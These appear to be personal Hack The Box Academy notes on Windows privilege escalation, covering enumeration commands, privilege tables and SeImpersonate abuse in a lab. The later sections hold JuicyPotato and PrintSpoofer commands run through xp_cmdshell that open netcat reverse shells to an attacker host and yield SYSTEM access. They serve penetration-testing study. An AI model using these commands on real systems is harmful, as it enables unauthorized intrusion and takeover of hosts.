# Hack The Box academy Windows Privilege Escalation notes
## Intro
Note: Depending on how we gain access to a system we may not have many directories that are writeable by our user to upload tools. It is always a safe bet to upload tools to C:\Windows\Temp because the BUILTIN\Users group has write access.  
## Situational Awareness
* Network Information
  * ipconfig /all, arp -a, route print
* Enumerating Protections
<pre>
# Check Windows Defender Status
Get-MpComputerStatus
# List AppLocker Rules
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
# Test AppLocker Policy
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone
</pre>
## Initial Enumeration
### Windows Enumeration CheatSheet !!!
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
### Intro
During an assessment, we may gain a low-privileged shell on a Windows host (domain-joined or not) and need to perform privilege escalation to further our access.  
We can escalate privileges to one of the following depending on the system configuration and what type of data we encounter:  
* The highly privileged **NT AUTHORITY\SYSTEM** account, or **LocalSystem** account which is a highly privileged account with more privileges than a local administrator account and is used to run most Windows services.
* The built-in local **administrator** account. Some organizations disable this account, but many do not. It is not uncommon to see this account reused across multiple systems in a client environment.
* Another local account that is a member of the local **Administrators** group. Any account in this group will have the same privileges as the built-in **administrator** account.
* A standard (non-privileged) domain user who is part of the local **Administrators** group.
* A domain admin (highly privileged in the Active Directory environment) that is part of the local **Administrators** group.
Windows Commands Reference
* Lists lots of manual enumeration tasks
* https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/windows-commands
### Key Data Points
* **OS name**: Knowing the type of Windows OS (workstation or server) and level (Windows 7 or 10, Server 2008, 2012, 2016, 2019, etc.) will give us an idea of the types of tools that may be available (such as the PowerShell version, or lack thereof on legacy systems. This would also identify the operating system version for which there may be public exploits available.
* **Version**: As with the OS version, there may be public exploits that target a vulnerability in a specific version of Windows. Windows system exploits can cause system instability or even a complete crash. Be careful running these against any production system, and make sure you fully understand the exploit and possible ramifications before running one.
* **Running Services**: Knowing what services are running on the host is important, especially those running as NT AUTHORITY\SYSTEM or an administrator-level account. A misconfigured or vulnerable service running in the context of a privileged account can be an easy win for privilege escalation.
### System Information
List services corresponds to processes:
* tasklist /svc
It is essential to become familiar with standard Windows processes such as:
* Session Manager Subsystem (smss.exe)
* Client Server Runtime Subsystem (csrss.exe)
* WinLogon (winlogon.exe)
* Local Security Authority Subsystem Service (LSASS)
* and Service Host (svchost.exe)
* among others and the services associated with them.
Other processes such as MsMpEng.exe, Windows Defender, are interesting because they can help us map out what protections are in place on the target host that we may have to evade/bypass.
### Display All Environment Variables
* set, echo %PATH%
However, it is not uncommon to find administrators (or applications) modify the PATH. One common example is to place Python or Java in the path, which would allow the execution of Python or . JAR files. If the folder placed in the PATH is writable by your user, it may be possible to perform DLL Injections against other applications.
Remember, when running a program, Windows looks for that program in the CWD (Current Working Directory) first, then from the PATH going left to right. This means if the custom path is placed on the left (before C:\Windows\System32), it is much more dangerous than on the right.  
In addition to the PATH, set can also give up other helpful information such as the HOME DRIVE. In enterprises, this will often be a file share. Navigating to the file share itself may reveal other directories that can be accessed.  
It is not unheard of to be able to access an "IT Directory," which contains an inventory spreadsheet that includes passwords. Additionally, shares are utilized for home directories so the user can log on to other computers and have the same experience/files/desktop/etc. (Roaming Profiles). This may also mean the user takes malicious items with them.
If a file is placed in USERPROFILE\AppData\Microsoft\Windows\Start Menu\Programs\Startup, when the user logs into a different machine, this file will execute.
### View Detailed Configuration Information
The **systeminfo** command will show if the box has been patched recently and if it is a VM.  
If the box has not been patched recently, getting administrator-level access may be as simple as running a known exploit.  
Google the KBs installed under HotFixes (https://www.catalog.update.microsoft.com/Search.aspx?q=hotfix) to get an idea of when the box has been patched.  
* This information isn't always present, as it is possible to hide hotfixes software from non-administrators.
The System Boot Time and OS Version can also be checked to get an idea of the patch level.  
If the box has not been restarted in over six months, chances are it is also not being patched.  
Additionally, many guides will say the Network Information is important as it could indicate a dual-homed machine (connected to multiple networks). Generally speaking, when it comes to enterprises, devices will just be granted access to other networks via a firewall rule and not have a physical cable run to them.  
Comands:
* systeminfo
### Patches and Updates
If systeminfo doesn't display hotfixes, they may be queriable with WMI using the WMI-Command binary with QFE (Quick Fix Engineering) to display patches.  
<pre>
C:\> wmic qfe
</pre>
We can do this with PowerShell as well using the Get-Hotfix cmdlet.  
<pre>
PS C:\> Get-HotFix | ft -AutoSize
</pre>
### Installed Programs
WMI can also be used to display installed software. This information can often guide us towards hard-to-find exploits. Is FileZilla/Putty/etc installed?  
Run **LaZagne** to check if stored credentials for those applications are installed. Also, some programs may be installed and running as a service that is vulnerable.  
<pre>
C:\> wmic product get name
</pre>
We can, of course, do this with PowerShell as well using the Get-WmiObject cmdlet.  
<pre>
PS C:\> Get-WmiObject -Class Win32_Product |  select Name, Version
</pre>
### Display Running Processes (that listening on the network)
Search for those are only available from localhost or some specific network / network card
<pre>
netstat -ano
</pre>
### User & Group Information
<pre>
# Logged-in Users
C:\> query user

# Current User
C:\> echo %USERNAME%
C:\> whoami

# Current User Privileges
C:\> whoami /priv

# Current User Group Information
C:\> whoami /groups

# Get All Users
C:\> net user

# Get All Groups
C:\> net localgroup

# Details About a Group
C:\> net localgroup administrators

# Get Password Policy & Other Account Information
C:\> net accounts
</pre>
## Communication with Processes
* One of the best places to look for privilege escalation is the processes that are running on the system.
* Even if a process is not running as an administrator, it may lead to additional privileges.
* The most common example is discovering a web server like IIS or XAMPP running on the box, placing an aspx/php shell on the box, and gaining a shell as the user running the web server.
  * Generally, this is not an administrator but will often have the SeImpersonate token, allowing for Rogue/Juicy/Lonely Potato to provide SYSTEM permissions.
### Access Tokens
In Windows, access tokens are used to describe the security context (security attributes or rules) of a process or thread. The token includes information about the user account's identity and privileges related to a specific process or thread. When a user authenticates to a system, their password is verified against a security database, and if properly authenticated, they will be assigned an access token. Every time a user interacts with a process, a copy of this token will be presented to determine their privilege level.  
### Methods of communication with processes
#### Enumerating Network Services
<pre>
C:\> netstat -ano
</pre>
#### Named Pipes
Listing named pipes
<pre>
#Listing Named Pipes with Pipelist (Sysinternals tool) (https://docs.microsoft.com/en-us/sysinternals/downloads/pipelist)
C:\> pipelist.exe /accepteula

# Listing Named Pipes with PowerShell
C:\> gci \\.\pipe\
</pre>
After obtaining a listing of named pipes, we can use Accesschk to enumerate the permissions assigned to a specific named pipe by reviewing the Discretionary Access List (DACL), which shows us who has the permissions to modify, write, read, or execute a resource. Let's take a look at the LSASS process. We can also review the DACLs of all named pipes using the command .\accesschk.exe /accepteula \pipe\.  
<pre>
# Reviewing LSASS Named Pipe Permissions
C:\> accesschk.exe /accepteula \\.\Pipe\lsass -v
</pre>
From the output above, we can see that only administrators have full access to the LSASS process, as expected.  
#### Named Pipes Attack Example
Let's walk through an example of taking advantage of an exposed named pipe to escalate privileges. This WindscribeService Named Pipe Privilege Escalation is a great example. Using accesschk we can search for all named pipes that allow write access with a command such as accesschk.exe -w \pipe\* -v and notice that the WindscribeService named pipe allows READ and WRITE access to the Everyone group, meaning all authenticated users.  
* https://www.exploit-db.com/exploits/48021
Confirming with accesschk we see that the Everyone group does indeed have FILE_ALL_ACCESS (All possible access rights) over the pipe.  
<pre>
# Checking WindscribeService Named Pipe Permissions
C:\> accesschk.exe -accepteula -w \pipe\WindscribeService -v

Accesschk v6.13 - Reports effective permissions for securable objects
Copyright ‚åê 2006-2020 Mark Russinovich
Sysinternals - www.sysinternals.com

\\.\Pipe\WindscribeService
  Medium Mandatory Level (Default) [No-Write-Up]
  RW Everyone
        FILE_ALL_ACCESS
</pre>
From here, we could leverage these lax permissions to escalate privileges on the host to SYSTEM.  
## Windows User Privileges
### Windows Privileges Overview
Privileges in Windows are rights that an account can be granted to perform a variety of operations on the local system such as managing services, loading drivers, shutting down the system, debugging an application, and more.  
User and group privileges are stored in a database and granted via an access token when a user logs on to a system.  
An account can have local privileges on a specific computer and different privileges on different systems if the account belongs to an Active Directory domain.  
Each time a user attempts to perform a privileged action, the system reviews the user's access token to see if the account has the required privileges, and if so, checks to see if they are enabled.  
Most privileges are disabled by default. Some can be enabled by opening an administrative cmd.exe or PowerShell console, while others can be enabled manually.  
#### Groups in Windows that grant powerful rights and privileges
|Group|Description|
|---|---|
|Default Administrators|Domain Admins and Enterprise Admins are "super" groups.|
|Server Operators|Members can modify services, access SMB shares, and backup files.|
|Backup Operators|Members are allowed to log onto DCs locally and should be considered Domain Admins. They can make shadow copies of the SAM/NTDS database, read the registry remotely, and access the file system on the DC via SMB. This group is sometimes added to the local Backup Operators group on non-DCs.|
|Print Operators|Members can log on to DCs locally and "trick" Windows into loading a malicious driver.|
|Hyper-V Administrators|If there are virtual DCs, any virtualization admins, such as members of Hyper-V Administrators, should be considered Domain Admins.|
|Account Operators|Members can modify non-protected accounts and groups in the domain.|
|Remote Desktop Users|Members are not given any useful permissions by default but are often granted additional rights such as Allow Login Through Remote Desktop Services and can move laterally using the RDP protocol.|
|Remote Management Users|Members can log on to DCs with PSRemoting (This group is sometimes added to the local remote management group on non-DCs).|
|Group Policy Creator Owners|Members can create new GPOs but would need to be delegated additional permissions to link GPOs to a container such as a domain or OU.|
|Schema Admins|Members can modify the Active Directory schema structure and backdoor any to-be-created Group/GPO by adding a compromised account to the default object ACL.|
|DNS Admins|Members can load a DLL on a DC, but do not have the necessary permissions to restart the DNS server. They can load a malicious DLL and wait for a reboot as a persistence mechanism. Loading a DLL will often result in the service crashing. A more reliable way to exploit this group is to create a WPAD record.|
#### Privileges
|Setting Constant|Setting Name|Standard Assignment|Description|
|---|---|---|---|
|SeNetworkLogonRight|Access this computer from the network|Administrators, Authenticated Users|Determines which users can connect to the device from the network. This is required by network protocols such as SMB, NetBIOS, CIFS, and COM+.|
|SeRemoteInteractiveLogonRight|Allow log on through Remote Desktop Services|Administrators, Remote Desktop Users|This policy setting determines which users or groups can access the login screen of a remote device through a Remote Desktop Services connection. A user can establish a Remote Desktop Services connection to a particular server but not be able to log on to the console of that same server.|
|SeBackupPrivilege|Back up files and directories|Administrators|This user right determines which users can bypass file and directory, registry, and other persistent object permissions for the purposes of backing up the system.|
|SeSecurityPrivilege|Manage auditing and security log|Administrators|This policy setting determines which users can specify object access audit options for individual resources such as files, Active Directory objects, and registry keys. These objects specify their system access control lists (SACL). A user assigned this user right can also view and clear the Security log in Event Viewer.|
|SeTakeOwnershipPrivilege|Take ownership of files or other objects|Administrators|This policy setting determines which users can take ownership of any securable object in the device, including Active Directory objects, NTFS files and folders, printers, registry keys, services, processes, and threads.|
|SeDebugPrivilege|Debug programs|Administrators|This policy setting determines which users can attach to or open any process, even a process they do not own. Developers who are debugging their applications do not need this user right. Developers who are debugging new system components need this user right. This user right provides access to sensitive and critical operating system components.|
|SeImpersonatePrivilege|Impersonate a client after authentication|Administrators, Local Service, Network Service, Service|This policy setting determines which programs are allowed to impersonate a user or another specified account and act on behalf of the user.|
|SeLoadDriverPrivilege|Load and unload device drivers|Administrators|This policy setting determines which users can dynamically load and unload device drivers. This user right is not required if a signed driver for the new hardware already exists in the driver.cab file on the device. Device drivers run as highly privileged code.|
|SeRestorePrivilege|Restore files and directories|Administrators|This security setting determines which users can bypass file, directory, registry, and other persistent object permissions when they restore backed up files and directories. It determines which users can set valid security principals as the owner of an object.|
#### Elevated vs Non-elevated console
UAC is managing the access that a console have.  
Non-elevated console has limited capabilities.  
You have to bypass UAC to get an elevated console.  
#### Enabled vs Disabled privileges
Even if you have an elevated console you cant you a privilege that is disabled.  
You have to enable it at first.  
There is no built-in cmd or powershell command to enable a privilege.  
You need to use some third party script to do that, like the below ones:
* https://www.powershellgallery.com/packages/PoshPrivilege/0.3.0.0/Content/Scripts%5CEnable-Privilege.ps1
* https://www.leeholmes.com/adjusting-token-privileges-in-powershell/
### SeImpersonate and SeAssignPrimaryToken
In Windows, every process has a token that has information about the account that is running it.  

To utilize the token, the SeImpersonate privilege is needed.  

It is only given to administrative accounts, and in most cases, can be removed during system hardening.  

An example of using this token would be CreateProcessWithTokenW.  

Legitimate programs may utilize another process's token to escalate from Administrator to Local System, which has additional privileges.  

Processes generally do this by making a call to the WinLogon process to get a SYSTEM token, then executing itself with that token placing it within the SYSTEM space.  

Attackers often abuse this privilege in the "**Potato style**" privescs - where a service account can SeImpersonate, but not obtain full SYSTEM level privileges. Essentially, the Potato attack tricks a process running as SYSTEM to connect to their process, which hands over the token to be used.  

We will often run into this privilege after gaining **remote code execution** via an application that runs in the context of a service account (for example, uploading a web shell to an ASP.NET web application, achieving remote code execution through a Jenkins installation, or by executing commands through MSSQL queries).  

Whenever we gain access in this way, we should immediately check for this privilege as its presence often offers a quick and easy route to elevated privileges.  

#### SeImpersonate Example - JuicyPotato
##### IMPORTANT !!!
```diff
- These are the potato attacks!!
- We need to check the Windows version because some potato attacks has been patched and not will be working on every Windows version and Windows build !!!
```
##### Intro
Let's take the example below, where we have gained a foothold on a SQL server using a privileged SQL user. Client connections to IIS and SQL Server may be configured to use Windows Authentication. The server may then need to access other resources such as file shares as the connecting client. It can be done by impersonating the user whose context the client connection is established. To do so, the service account will be granted the Impersonate a client after authentication privilege.  

In this scenario, the SQL Service service account is running in the context of the default mssqlserver account. Imagine we have achieved command execution as this user using xp_cmdshell using a set of credentials obtained in a logins.sql file on a file share using the Snaffler tool.  
##### Initial steps
<pre>
# Connecting with MSSQLClient.py
# Using the credentials sql_dev:Str0ng_P@ssw0rd!
mrFiSHER@htb[/htb]$ mssqlclient.py sql_dev@10.129.43.30 -windows-auth
Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation
Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 1: Changed database context to 'master'.
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (130 19162) 
[!] Press help for extra shell commands
SQL>

# Enabling xp_cmdshell
# Note: We don't actually have to type RECONFIGURE as Impacket does this for us.
SQL> enable_xp_cmdshell
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install

# Confirming Access
# With this access, we can confirm that we are indeed running in the context of a SQL Server service account.
SQL> xp_cmdshell whoami
output                                                                             
--------------------------------------------------------------------------------   
nt service\mssql$sqlexpress01 

# Checking Account Privileges
# Next, let's check what privileges the service account has been granted.
SQL> xp_cmdshell whoami /priv
output                                                                             
--------------------------------------------------------------------------------   
PRIVILEGES INFORMATION                                                             
----------------------                                                             
Privilege Name                Description                               State      
============================= ========================================= ========   
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled    
SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
SeCreateGlobalPrivilege       Create global objects                     Enabled    
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   
</pre>
The command whoami /priv confirms that SeImpersonatePrivilege is listed. This privilege can be used to impersonate a privileged account such as NT AUTHORITY\SYSTEM. **JuicyPotato** can be used to exploit the **SeImpersonate** or **SeAssignPrimaryToken** privileges via DCOM/NTLM reflection abuse.  
* https://github.com/ohpe/juicy-potato
##### Escalating Privileges Using JuicyPotato
To escalate privileges using these rights, let's first download the JuicyPotato.exe binary and upload this and nc.exe to the target server. Next, stand up a Netcat listener on port 8443, and execute the command below where -l is the COM server listening port, -p is the program to launch (cmd.exe), -a is the argument passed to cmd.exe, and -t is the createprocess call. Below, we are telling the tool to try both the CreateProcessWithTokenW and CreateProcessAsUser functions, which need SeImpersonate or SeAssignPrimaryToken privileges respectively.  
<pre>
# Escalating Privileges Using JuicyPotato
SQL> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
output                                                                             
--------------------------------------------------------------------------------   
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 53375                               
[+] authresult 0                                                                   
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM                                                                                       
[+] CreateProcessWithTokenW OK                                                     
[+] calling 0x000000000088ce08

# Catching SYSTEM Shell
mrFiSHER@htb[/htb]$ sudo nc -lnvp 8443
listening on [any] 8443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.30] 50332
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.
C:\Windows\system32>whoami
nt authority\system
C:\Windows\system32>hostname
WINLPE-SRV01
</pre>
#### PrintSpoofer and RoguePotato
JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards. However, PrintSpoofer and RoguePotato can be used to leverage the same privileges and gain NT AUTHORITY\SYSTEM level access. This blog post goes in-depth on the PrintSpoofer tool, which can be used to abuse impersonation privileges on Windows 10 and Server 2019 hosts where JuicyPotato no longer works.  
* Download tools from here:
  * https://github.com/itm4n/PrintSpoofer
  * https://github.com/antonioCoco/RoguePotato
* See PrintSpoofer detailed explanation here: https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/
##### Escalating Privileges using PrintSpoofer
Let's try this out using the PrintSpoofer tool. We can use the tool to spawn a SYSTEM process in your current console and interact with it, spawn a SYSTEM process on a desktop (if logged on locally or via RDP), or catch a reverse shell - which we will do in our example. Again, connect with mssqlclient.py and use the tool with the -c argument to execute a command. Here, using nc.exe to spawn a reverse shell (with a Netcat listener waiting on our attack box on port 8443).  
<pre>
# Escalating Privileges using PrintSpoofer
SQL> xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
output
--------------------------------------------------------------------------------   
[+] Found privilege: SeImpersonatePrivilege                                        
[+] Named pipe listening...                                                        
[+] CreateProcessAsUser() OK                                                       
NULL

# Catching Reverse Shell as SYSTEM
mrFiSHER@htb[/htb]$ nc -lnvp 8443
listening on [any] 8443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.30] 49847
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.
C:\Windows\system32>whoami
nt authority\system
</pre>
Escalating privileges by leveraging SeImpersonate is very common. It is essential to be familiar with the various methods available to us depending on the target host OS version and level.  
### SeDebugPrivilege
### SeTakeOwnershipPrivilege
